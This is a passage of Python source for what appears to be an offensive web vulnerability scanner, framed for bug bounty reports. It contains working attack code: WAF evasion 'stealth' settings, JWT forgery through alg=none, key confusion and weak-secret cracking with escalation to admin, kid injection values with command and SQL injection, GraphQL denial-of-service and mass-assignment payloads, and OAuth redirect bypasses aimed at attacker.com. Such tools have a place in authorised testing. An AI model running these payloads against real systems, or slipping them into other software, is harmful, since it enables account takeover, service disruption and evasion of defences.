            for sig in signatures:
                # Check headers
                for header_key, header_value in headers_lower.items():
                    if sig in header_key or sig in header_value:
                        return waf_name

                # Check body
                if sig in body_lower:
                    return waf_name

        return None

    @staticmethod
    def get_stealth_config(waf_name: Optional[str]) -> dict:
        """
        Get recommended stealth configuration for detected WAF

        Returns:
            Dict with rps, jitter, and delay recommendations
        """
        if not waf_name:
            return {"rps": 10.0, "jitter": 0.3, "delay": 0.1}

        # Conservative settings for known WAFs
        waf_configs = {
            "Cloudflare": {"rps": 3.0, "jitter": 0.5, "delay": 0.5},
            "Imperva": {"rps": 2.0, "jitter": 0.6, "delay": 0.8},
            "Akamai": {"rps": 4.0, "jitter": 0.4, "delay": 0.3},
            "AWS WAF": {"rps": 5.0, "jitter": 0.3, "delay": 0.2},
            "F5 BIG-IP": {"rps": 3.0, "jitter": 0.5, "delay": 0.5},
            "ModSecurity": {"rps": 4.0, "jitter": 0.4, "delay": 0.3},
        }

        return waf_configs.get(waf_name, {"rps": 2.0, "jitter": 0.6, "delay": 1.0})


# Test


# === JWT Attacker ===
"""
JWT Attack Module
Tests for JWT vulnerabilities: algorithm confusion, weak secrets, etc.
"""

import json
import base64
import hashlib
import hmac
from typing import Dict, List, Tuple, Optional


class JWTAttacker:
    """JWT vulnerability testing"""

    # Common weak secrets for brute force
    WEAK_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "test",
        "key",
        "jwt",
        "token",
        "secret123",
        "password123",
        "qwerty",
        "12345678",
        "abc123",
        "letmein",
        "monkey",
        "dragon",
    ]

    @staticmethod
    def decode_jwt(token: str) -> Optional[Dict]:
        """
        Decode JWT without verification

        Args:
            token: JWT token string

        Returns:
            Dict with header, payload, signature or None if invalid
        """
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header and payload
            header = json.loads(JWTAttacker._base64_decode(parts[0]))
            payload = json.loads(JWTAttacker._base64_decode(parts[1]))
            signature = parts[2]

            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "raw": token,
            }
        except:
            return None

    @staticmethod
    def _base64_decode(data: str) -> str:
        """Decode base64url"""
        # Add padding if needed
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding

        # Replace URL-safe chars
        data = data.replace("-", "+").replace("_", "/")

        return base64.b64decode(data).decode("utf-8")

    @staticmethod
    def _base64_encode(data: str) -> str:
        """Encode to base64url"""
        encoded = base64.b64encode(data.encode("utf-8")).decode("utf-8")
        # Remove padding and make URL-safe
        return encoded.rstrip("=").replace("+", "-").replace("/", "_")

    @staticmethod
    def none_algorithm_attack(token: str) -> List[str]:
        """
        Generate JWT with 'none' algorithm (CVE-2015-9235)

        Args:
            token: Original JWT token

        Returns:
            List of attack payloads
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []

        # Attack 1: alg=none
        header = decoded["header"].copy()
        header["alg"] = "none"

        header_b64 = JWTAttacker._base64_encode(json.dumps(header))
        payload_b64 = JWTAttacker._base64_encode(json.dumps(decoded["payload"]))

        # With empty signature
        payloads.append(f"{header_b64}.{payload_b64}.")

        # Without signature
        payloads.append(f"{header_b64}.{payload_b64}")

        # Attack 2: alg=None (capital N)
        header["alg"] = "None"
        header_b64 = JWTAttacker._base64_encode(json.dumps(header))
        payloads.append(f"{header_b64}.{payload_b64}.")

        # Attack 3: alg=NONE (all caps)
        header["alg"] = "NONE"
        header_b64 = JWTAttacker._base64_encode(json.dumps(header))
        payloads.append(f"{header_b64}.{payload_b64}.")

        return payloads

    @staticmethod
    def algorithm_confusion_attack(token: str) -> List[str]:
        """
        RS256 to HS256 confusion attack
        Server uses RS256 (asymmetric) but accepts HS256 (symmetric)

        Args:
            token: Original JWT token

        Returns:
            List of attack payloads
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []

        # Change algorithm to HS256
        header = decoded["header"].copy()
        original_alg = header.get("alg", "")

        if original_alg.startswith("RS") or original_alg.startswith("ES"):
            header["alg"] = "HS256"

            header_b64 = JWTAttacker._base64_encode(json.dumps(header))
            payload_b64 = JWTAttacker._base64_encode(json.dumps(decoded["payload"]))

            # Sign with common public key strings
            common_keys = [
                "-----BEGIN PUBLIC KEY-----",
                "public.pem",
                "publickey",
            ]

            for key in common_keys:
                signature = hmac.new(
                    key.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
                ).digest()

                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
                payloads.append(f"{header_b64}.{payload_b64}.{sig_b64}")

        return payloads

    @staticmethod
    def weak_secret_attack(token: str) -> List[Tuple[str, str]]:
        """
        Brute force JWT with weak secrets

        Args:
            token: Original JWT token

        Returns:
            List of (secret, forged_token) tuples
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        results = []

        header_b64 = token.split(".")[0]
        payload_b64 = token.split(".")[1]
        original_sig = token.split(".")[2]

        # Try to crack the secret
        for secret in JWTAttacker.WEAK_SECRETS:
            # Calculate signature with this secret
            signature = hmac.new(
                secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
            ).digest()

            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

            # Check if it matches
            if sig_b64 == original_sig:
                # Found the secret! Now forge token
                payload = decoded["payload"].copy()

                # Modify payload (e.g., escalate privileges)
                if "role" in payload:
                    payload["role"] = "admin"
                if "admin" in payload:
                    payload["admin"] = True
                if "user" in payload:
                    payload["user"] = "admin"

                # Create forged token
                new_payload_b64 = JWTAttacker._base64_encode(json.dumps(payload))
                new_signature = hmac.new(
                    secret.encode(),
                    f"{header_b64}.{new_payload_b64}".encode(),
                    hashlib.sha256,
                ).digest()
                new_sig_b64 = (
                    base64.urlsafe_b64encode(new_signature).decode().rstrip("=")
                )

                forged_token = f"{header_b64}.{new_payload_b64}.{new_sig_b64}"
                results.append((secret, forged_token))

        return results

    @staticmethod
    def kid_injection_attack(token: str) -> List[str]:
        """
        Key ID (kid) injection attack

        Args:
            token: Original JWT token

        Returns:
            List of attack payloads
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []

        # Inject malicious kid values
        malicious_kids = [
            "/dev/null",  # Empty key
            "../../public.pem",  # Path traversal
            "/proc/self/environ",  # Linux env vars
            "http://attacker.com/key",  # SSRF
            "| whoami",  # Command injection
            "'; DROP TABLE users--",  # SQL injection
        ]

        for kid in malicious_kids:
            header = decoded["header"].copy()
            header["kid"] = kid

            header_b64 = JWTAttacker._base64_encode(json.dumps(header))
            payload_b64 = JWTAttacker._base64_encode(json.dumps(decoded["payload"]))

            # Sign with empty key (for /dev/null)
            signature = hmac.new(
                b"", f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
            ).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

            payloads.append(f"{header_b64}.{payload_b64}.{sig_b64}")

        return payloads

    @staticmethod
    def generate_test_payloads(token: str) -> Dict[str, List]:
        """
        Generate all JWT attack payloads

        Args:
            token: Original JWT token

        Returns:
            Dict with attack type -> payloads
        """
        return {
            "none_algorithm": JWTAttacker.none_algorithm_attack(token),
            "algorithm_confusion": JWTAttacker.algorithm_confusion_attack(token),
            "weak_secret": JWTAttacker.weak_secret_attack(token),
            "kid_injection": JWTAttacker.kid_injection_attack(token),
        }


# Test


# === GraphQL Tester ===
"""
Enhanced GraphQL Testing Module
Tests for GraphQL vulnerabilities: introspection, depth attacks, field suggestions
"""

import json
from typing import List, Dict, Optional


class GraphQLTester:
    """Advanced GraphQL vulnerability testing"""

    @staticmethod
    def introspection_query() -> str:
        """
        Full introspection query to discover schema

        Returns:
            GraphQL introspection query
        """
        return """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """

    @staticmethod
    def simple_introspection_query() -> str:
        """Simplified introspection query"""
        return """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                }
              }
            }
          }
        }
        """

    @staticmethod
    def generate_depth_attack(depth: int = 100) -> str:
        """
        Generate deeply nested query for DoS

        Args:
            depth: Nesting depth (default: 100)

        Returns:
            Deeply nested GraphQL query
        """
        query = "query DepthAttack {\n"

        # Build nested structure
        indent = "  "
        for i in range(depth):
            query += indent * (i + 1) + "user {\n"
            query += indent * (i + 2) + "id\n"
            query += indent * (i + 2) + "name\n"
            query += indent * (i + 2) + "posts {\n"
            query += indent * (i + 3) + "id\n"
            query += indent * (i + 3) + "title\n"
            query += indent * (i + 3) + "author {\n"

        # Close all brackets
        for i in range(depth):
            query += indent * (depth - i + 2) + "}\n"
            query += indent * (depth - i + 1) + "}\n"
            query += indent * (depth - i) + "}\n"

        query += "}"

        return query

    @staticmethod
    def generate_batch_attack(count: int = 100) -> str:
        """
        Generate batch query for DoS

        Args:
            count: Number of queries in batch

        Returns:
            Batch GraphQL query
        """
        queries = []

        for i in range(count):
            queries.append(f"""
            query{i}: users {{
              id
              name
              email
              posts {{
                id
                title
                content
                comments {{
                  id
                  text
                  author {{
                    id
                    name
                  }}
                }}
              }}
            }}
            """)

        return "{\n" + "\n".join(queries) + "\n}"

    @staticmethod
    def generate_circular_query(depth: int = 50) -> str:
        """
        Generate circular reference query

        Args:
            depth: Circular depth

        Returns:
            Circular GraphQL query
        """
        query = "query CircularAttack {\n  user(id: 1) {\n    id\n    name\n"

        for i in range(depth):
            query += "    friends {\n      id\n      name\n"

        for i in range(depth):
            query += "    }\n"

        query += "  }\n}"

        return query

    @staticmethod
    def field_suggestion_queries() -> List[str]:
        """
        Generate queries to discover hidden fields via suggestions

        Returns:
            List of queries with typos to trigger suggestions
        """
        return [
            "{ user { idd } }",  # Typo: id -> idd (suggests: id)
            "{ user { usernam } }",  # Typo: username -> usernam
            "{ user { emai } }",  # Typo: email -> emai
            "{ user { passwor } }",  # Typo: password -> passwor
            "{ user { toke } }",  # Typo: token -> toke
            "{ user { ap_key } }",  # Typo: api_key -> ap_key
            "{ user { isAdmi } }",  # Typo: isAdmin -> isAdmi
            "{ user { rol } }",  # Typo: role -> rol
        ]

    @staticmethod
    def idor_queries() -> List[Dict]:
        """
        Generate IDOR test queries

        Returns:
            List of query dicts with variables
        """
        return [
            {
                "query": "query GetUser($id: ID!) { user(id: $id) { id name email phone address ssn } }",
                "variables": {"id": "1"},
            },
            {
                "query": "query GetUser($id: ID!) { user(id: $id) { id name email phone address ssn } }",
                "variables": {"id": "2"},
            },
            {
                "query": "query GetUser($id: ID!) { user(id: $id) { id name email phone address ssn } }",
                "variables": {"id": "999999"},
            },
            {
                "query": "query GetPost($id: ID!) { post(id: $id) { id title content author { id email } } }",
                "variables": {"id": "1"},
            },
        ]

    @staticmethod
    def mutation_attacks() -> List[str]:
        """
        Generate mutation attack queries

        Returns:
            List of mutation queries
        """
        return [
            # Mass assignment
            """
            mutation {
              updateUser(id: 1, input: {
                name: "Hacker"
                email: "hacker@evil.com"
                role: "admin"
                isAdmin: true
                permissions: ["*"]
              }) {
                id
                role
                isAdmin
              }
            }
            """,
            # Negative price
            """
            mutation {
              createOrder(input: {
                productId: 1
                quantity: 1
                price: -100
              }) {
                id
                total
              }
            }
            """,
            # SQL injection in mutation
            """
            mutation {
              createUser(input: {
                name: "test' OR '1'='1"
                email: "test@test.com"
              }) {
                id
              }
            }
            """,
        ]

    @staticmethod
    def directive_overload() -> str:
        """
        Generate query with excessive directives

        Returns:
            Query with directive overload
        """
        query = "query DirectiveOverload {\n"

        for i in range(100):
            query += f"  field{i}: user(id: 1) @include(if: true) @skip(if: false) {{\n"
            query += "    id\n"
            query += "    name\n"
            query += "  }\n"

        query += "}"

        return query

    @staticmethod
    def generate_all_attacks() -> Dict[str, any]:
        """
        Generate all GraphQL attack payloads

        Returns:
            Dict with attack type -> payloads
        """
        return {
            "introspection_full": GraphQLTester.introspection_query(),
            "introspection_simple": GraphQLTester.simple_introspection_query(),
            "depth_attack_50": GraphQLTester.generate_depth_attack(50),
            "depth_attack_100": GraphQLTester.generate_depth_attack(100),
            "batch_attack_50": GraphQLTester.generate_batch_attack(50),
            "batch_attack_100": GraphQLTester.generate_batch_attack(100),
            "circular_query": GraphQLTester.generate_circular_query(50),
            "field_suggestions": GraphQLTester.field_suggestion_queries(),
            "idor_queries": GraphQLTester.idor_queries(),
            "mutation_attacks": GraphQLTester.mutation_attacks(),
            "directive_overload": GraphQLTester.directive_overload(),
        }


# Test


# === OAuth Tester ===
"""
OAuth 2.0 Flow Testing Module
Tests for OAuth vulnerabilities: redirect_uri bypass, state parameter, token theft
"""

from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class OAuthTester:
    """OAuth 2.0 vulnerability testing"""

    @staticmethod
    def redirect_uri_bypass_payloads(original_redirect: str) -> List[str]:
        """
        Generate redirect_uri bypass payloads

        Args:
            original_redirect: Original redirect_uri (e.g., https://example.com/callback)

        Returns:
            List of bypass payloads
        """
        parsed = urlparse(original_redirect)
        domain = parsed.netloc
        path = parsed.path

        payloads = [
            # Open redirect
            f"{original_redirect}?next=https://attacker.com",
            f"{original_redirect}#https://attacker.com",
            # Path traversal
            f"{parsed.scheme}://{domain}{path}/../../../attacker.com",
            f"{parsed.scheme}://{domain}{path}/../../attacker.com",
            # Subdomain bypass
            f"{parsed.scheme}://attacker.{domain}{path}",
            f"{parsed.scheme}://{domain}.attacker.com{path}",
            # Domain confusion
            f"{parsed.scheme}://{domain}@attacker.com{path}",
            f"{parsed.scheme}://attacker.com@{domain}{path}",
            f"{parsed.scheme}://{domain}%2eattacker.com{path}",
            # Protocol bypass
            f"http://{domain}{path}",  # If original is https
            f"javascript:alert(1)//{domain}{path}",
            # Null byte injection
            f"{parsed.scheme}://{domain}%00.attacker.com{path}",
            # CRLF injection
            f"{original_redirect}%0d%0aLocation:%20https://attacker.com",
            # Wildcard abuse
            f"{parsed.scheme}://evil-{domain}{path}",
            f"{parsed.scheme}://{domain}-evil.com{path}",
            # IDN homograph
            f"{parsed.scheme}://еxample.com{path}",  # Cyrillic 'e'
            # Fragment bypass
            f"{original_redirect}#@attacker.com",
            # Backslash bypass
            f"{parsed.scheme}://{domain}\\@attacker.com{path}",
            # Double encoding
            f"{parsed.scheme}://{domain}%252e%252e%252fattacker.com{path}",
        ]

        return payloads

    @staticmethod
    def state_parameter_attacks() -> List[Dict]:
        """
        Generate state parameter attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Missing state parameter",
                "description": "CSRF attack - no state validation",
                "test": "Remove state parameter from OAuth flow",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI",
            },
            {
                "name": "Empty state parameter",
                "description": "State parameter present but empty",
                "test": "Set state to empty string",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=",
            },
            {
                "name": "Predictable state",
                "description": "State parameter is predictable (e.g., timestamp)",
                "test": "Use predictable values like '1', '123', timestamp",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=1",
            },
            {
                "name": "State reuse",
                "description": "Reuse same state token multiple times",
                "test": "Complete OAuth flow twice with same state",
                "payload": "?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&state=REUSED_STATE",
            },
        ]

    @staticmethod
    def implicit_flow_attacks() -> List[Dict]:
        """
        Generate implicit flow attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Token in URL fragment",
                "description": "Access token exposed in URL (referer leakage)",
                "test": "Check if access_token is in URL fragment",
                "risk": "HIGH - Token can leak via Referer header",
            },
            {
                "name": "No token expiration",
                "description": "Access token never expires",
                "test": "Use old access token after long time",
                "risk": "MEDIUM - Stolen tokens valid forever",
            },
            {
                "name": "Token in browser history",
                "description": "Token stored in browser history",
                "test": "Check browser history for access_token",
                "risk": "HIGH - Token accessible to malware",
            },
        ]

    @staticmethod
    def scope_escalation_payloads() -> List[str]:
        """
        Generate scope escalation payloads

        Returns:
            List of scope payloads
        """
        return [
            # Request excessive scopes
            "scope=read write admin delete",
            "scope=*",
            "scope=all",
            "scope=user:email user:admin repo:delete",
            # Scope injection
            "scope=read%20admin",
            "scope=read+admin",
            "scope=read%0aadmin",
            # Wildcard scopes
            "scope=user:*",
            "scope=repo:*",
            "scope=admin:*",
        ]

    @staticmethod
    def client_secret_attacks() -> List[Dict]:
        """
        Generate client secret attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Client secret in JavaScript",
                "description": "Client secret exposed in frontend code",
                "test": "Search JS files for client_secret, api_key",
                "pattern": r"client_secret['\"]?\s*[:=]\s*['\"]([^'\"]+)",
            },
            {
                "name": "Client secret in mobile app",
                "description": "Client secret hardcoded in mobile app",
                "test": "Decompile APK/IPA and search for secrets",
                "pattern": r"client_secret|api_key|oauth_secret",
            },
            {
                "name": "Weak client secret",
                "description": "Client secret is weak or default",
                "test": "Try common secrets: 'secret', 'password', '123456'",
                "common_secrets": [
                    "secret",
                    "password",
                    "123456",
                    "client_secret",
                    "oauth",
                ],
            },
        ]

    @staticmethod
    def authorization_code_attacks() -> List[Dict]:
        """
        Generate authorization code attack scenarios

        Returns:
            List of attack scenarios
        """
        return [
            {
                "name": "Code replay attack",
                "description": "Reuse authorization code multiple times",
                "test": "Exchange same code for token twice",
                "expected": "Second exchange should fail",
            },
            {
                "name": "Code interception",
                "description": "Intercept authorization code via redirect",
                "test": "Use attacker's redirect_uri to steal code",
                "payload": "redirect_uri=https://attacker.com/callback",
            },
            {
                "name": "Code without PKCE",
                "description": "Authorization code flow without PKCE protection",
                "test": "Complete flow without code_challenge parameter",
                "risk": "HIGH - Vulnerable to code interception",
            },
        ]

    @staticmethod
    def token_endpoint_attacks() -> List[Dict]:
        """
        Generate token endpoint attack payloads

        Returns:
            List of attack payloads
        """
        return [
            {
                "name": "Client credentials in URL",
                "description": "Send client_id/secret in URL instead of body",
                "payload": "/token?grant_type=authorization_code&code=CODE&client_id=ID&client_secret=SECRET",
            },
            {
                "name": "Missing client authentication",
                "description": "Exchange code without client credentials",
                "payload": {
                    "grant_type": "authorization_code",
                    "code": "CODE",
                    "redirect_uri": "URI",
                },
            },
            {
                "name": "Grant type confusion",
                "description": "Use wrong grant type",
                "payload": {
                    "grant_type": "password",
                    "username": "admin",
                    "password": "admin",
                },
            },
            {
                "name": "Refresh token theft",
                "description": "Steal and reuse refresh token",
                "payload": {
                    "grant_type": "refresh_token",
                    "refresh_token": "STOLEN_TOKEN",
                },
            },
        ]

    @staticmethod
    def generate_oauth_test_suite(
        base_url: str, redirect_uri: str, client_id: str
    ) -> Dict:
        """
        Generate complete OAuth test suite

        Args:
            base_url: OAuth provider base URL
            redirect_uri: Application redirect URI
            client_id: OAuth client ID

        Returns:
            Dict with all OAuth attack scenarios
        """
        return {
            "redirect_uri_bypass": OAuthTester.redirect_uri_bypass_payloads(
                redirect_uri
            ),
            "state_attacks": OAuthTester.state_parameter_attacks(),
            "implicit_flow": OAuthTester.implicit_flow_attacks(),
            "scope_escalation": OAuthTester.scope_escalation_payloads(),
            "client_secret": OAuthTester.client_secret_attacks(),
            "authorization_code": OAuthTester.authorization_code_attacks(),
            "token_endpoint": OAuthTester.token_endpoint_attacks(),
        }


# Test


# === HTML Report Generator ===
"""
HTML Report Generator with curl PoC Commands
Professional vulnerability reports for bug bounty submissions
"""

from datetime import datetime
from typing import List, Dict
import html


class HTMLReportGenerator:
    """Generate professional HTML reports with curl PoCs"""

    @staticmethod
    def generate_curl_command(finding: Dict) -> str:
        """
        Generate curl command to reproduce vulnerability

        Args:
            finding: Vulnerability finding dict

        Returns:
            curl command string
        """
        url = finding.get("url", "")
        method = finding.get("method", "GET")
        headers = finding.get("headers", {})
        body = finding.get("body", "")
        payload = finding.get("payload", "")

        # Build curl command
        cmd = f"curl -X {method}"

        # Add headers
        for key, value in headers.items():
            cmd += f" \\\n  -H '{key}: {value}'"

        # Add body if POST/PUT
        if body and method in ["POST", "PUT", "PATCH"]:
            cmd += f" \\\n  -d '{body}'"

        # Add URL with payload
        if payload and method == "GET":
            separator = "&" if "?" in url else "?"
            cmd += f" \\\n  '{url}{separator}{payload}'"
        else:
            cmd += f" \\\n  '{url}'"

        return cmd

    @staticmethod
    def generate_report(target: str, findings: List[Dict], scan_stats: Dict) -> str:
        """
        Generate complete HTML report

        Args:
            target: Target URL
            findings: List of vulnerability findings
            scan_stats: Scan statistics

        Returns:
            HTML report string
        """

        # Sort findings by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_findings = sorted(
            findings, key=lambda x: severity_order.get(x.get("severity", "INFO"), 5)
        )

        # Count by severity
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in findings:
            sev = f.get("severity", "INFO")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        # Generate HTML
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZEVS v2.0 - Vulnerability Report</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            line-height: 1.6;
            padding: 20px;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
        }}
        
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 40px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }}
        
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
            color: white;
        }}
        
        .header .subtitle {{
            font-size: 1.2em;
            opacity: 0.9;
            color: white;
        }}
        
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .stat-card {{
            background: #1a1f3a;
            padding: 25px;
            border-radius: 8px;
            border-left: 4px solid;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }}
        
        .stat-card.critical {{ border-color: #dc2626; }}
        .stat-card.high {{ border-color: #ea580c; }}
        .stat-card.medium {{ border-color: #f59e0b; }}
        .stat-card.low {{ border-color: #3b82f6; }}
        .stat-card.info {{ border-color: #6b7280; }}
        
        .stat-card .number {{
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 5px;
        }}
        
        .stat-card.critical .number {{ color: #dc2626; }}
        .stat-card.high .number {{ color: #ea580c; }}
        .stat-card.medium .number {{ color: #f59e0b; }}
        .stat-card.low .number {{ color: #3b82f6; }}
        .stat-card.info .number {{ color: #6b7280; }}
        
        .stat-card .label {{
            font-size: 0.9em;
            text-transform: uppercase;
            opacity: 0.7;
        }}
        
        .finding {{
            background: #1a1f3a;
            margin-bottom: 25px;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            border-left: 5px solid;
        }}
        
        .finding.critical {{ border-color: #dc2626; }}
        .finding.high {{ border-color: #ea580c; }}
        .finding.medium {{ border-color: #f59e0b; }}
        .finding.low {{ border-color: #3b82f6; }}
        .finding.info {{ border-color: #6b7280; }}
        
        .finding-header {{
            padding: 25px;
            background: rgba(255,255,255,0.03);
            cursor: pointer;
            transition: background 0.2s;
        }}
        
        .finding-header:hover {{
            background: rgba(255,255,255,0.05);
        }}
        
        .finding-title {{
            font-size: 1.4em;
            font-weight: 600;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 15px;
        }}
        
        .severity-badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.7em;
            font-weight: bold;
            text-transform: uppercase;
        }}
        
        .severity-badge.critical {{ background: #dc2626; color: white; }}
        .severity-badge.high {{ background: #ea580c; color: white; }}
        .severity-badge.medium {{ background: #f59e0b; color: white; }}
        .severity-badge.low {{ background: #3b82f6; color: white; }}
        .severity-badge.info {{ background: #6b7280; color: white; }}
        
        .cvss-score {{
            display: inline-block;
            padding: 5px 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 5px;
            font-size: 0.7em;
            font-weight: bold;
        }}
        
        .finding-url {{
            color: #60a5fa;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        
        .finding-body {{
            padding: 25px;
            display: none;
        }}
        
        .finding-body.active {{
            display: block;
        }}
        
        .section {{
            margin-bottom: 25px;
        }}
        
        .section-title {{
            font-size: 1.1em;
            font-weight: 600;
            margin-bottom: 10px;
            color: #a78bfa;
        }}
        
        .code-block {{
            background: #0f1419;
            padding: 20px;
            border-radius: 5px;
            overflow-x: auto;
            border: 1px solid #2d3748;
        }}
        
        .code-block pre {{
            margin: 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            color: #e0e0e0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }}
        
        .evidence {{
            background: rgba(239, 68, 68, 0.1);
            padding: 15px;
            border-radius: 5px;
            border-left: 3px solid #ef4444;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        
        .copy-btn {{
            background: #667eea;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9em;
            margin-top: 10px;
            transition: background 0.2s;
        }}
        
        .copy-btn:hover {{
            background: #5568d3;
        }}
        
        .footer {{
            text-align: center;
            padding: 30px;
            margin-top: 50px;
            opacity: 0.6;
            font-size: 0.9em;
        }}
        
        .scan-info {{
            background: #1a1f3a;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }}
        
        .scan-info-item {{
            display: flex;
            flex-direction: column;
        }}
        
        .scan-info-label {{
            font-size: 0.85em;
            opacity: 0.7;
            margin-bottom: 5px;
        }}
        
        .scan-info-value {{
            font-size: 1.1em;
            font-weight: 600;
            color: #60a5fa;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ ZEVS v2.0 PRO</h1>
            <div class="subtitle">Professional Vulnerability Assessment Report</div>
        </div>
        
        <div class="scan-info">
            <div class="scan-info-item">
                <div class="scan-info-label">Target</div>
                <div class="scan-info-value">{html.escape(target)}</div>
            </div>
            <div class="scan-info-item">
                <div class="scan-info-label">Scan Date</div>
                <div class="scan-info-value">{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</div>
            </div>
            <div class="scan-info-item">
                <div class="scan-info-label">Total Requests</div>
                <div class="scan-info-value">{scan_stats.get("total_requests", 0)}</div>
            </div>
            <div class="scan-info-item">
                <div class="scan-info-label">Scan Duration</div>
                <div class="scan-info-value">{scan_stats.get("duration", "0s")}</div>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-card critical">
                <div class="number">{severity_counts["CRITICAL"]}</div>
                <div class="label">Critical</div>
            </div>
            <div class="stat-card high">
                <div class="number">{severity_counts["HIGH"]}</div>
                <div class="label">High</div>
            </div>
            <div class="stat-card medium">
                <div class="number">{severity_counts["MEDIUM"]}</div>
                <div class="label">Medium</div>
            </div>
            <div class="stat-card low">
                <div class="number">{severity_counts["LOW"]}</div>
                <div class="label">Low</div>
            </div>
            <div class="stat-card info">
                <div class="number">{severity_counts["INFO"]}</div>
                <div class="label">Info</div>
            </div>
        </div>
        
        <h2 style="margin-bottom: 20px; color: #a78bfa;">Findings ({len(findings)})</h2>
"""

        # Add findings
        for idx, finding in enumerate(sorted_findings, 1):
            severity = finding.get("severity", "INFO").lower()
            vuln_type = html.escape(finding.get("type", "Unknown"))
            url = html.escape(finding.get("url", ""))
            description = html.escape(finding.get("description", ""))
            evidence = html.escape(finding.get("evidence", ""))
            payload = html.escape(finding.get("payload", ""))
            cvss_score = finding.get("cvss_score", "N/A")
            cvss_vector = finding.get("cvss_vector", "")

            # Generate curl command
            curl_cmd = HTMLReportGenerator.generate_curl_command(finding)
            curl_cmd_escaped = html.escape(curl_cmd)

            html_content += f"""
        <div class="finding {severity}">
            <div class="finding-header" onclick="toggleFinding({idx})">
                <div class="finding-title">
                    <span>#{idx}</span>
                    <span>{vuln_type}</span>
                    <span class="severity-badge {severity}">{severity.upper()}</span>
                    <span class="cvss-score">CVSS {cvss_score}</span>
                </div>
                <div class="finding-url">{url}</div>
            </div>
            <div class="finding-body" id="finding-{idx}">
                <div class="section">
                    <div class="section-title">Description</div>
                    <p>{description}</p>
                </div>
                
                <div class="section">
                    <div class="section-title">Evidence</div>
                    <div class="evidence">{evidence}</div>
                </div>
                
                <div class="section">
                    <div class="section-title">Payload</div>
                    <div class="code-block">
                        <pre>{payload}</pre>
                    </div>
                </div>
                
                <div class="section">
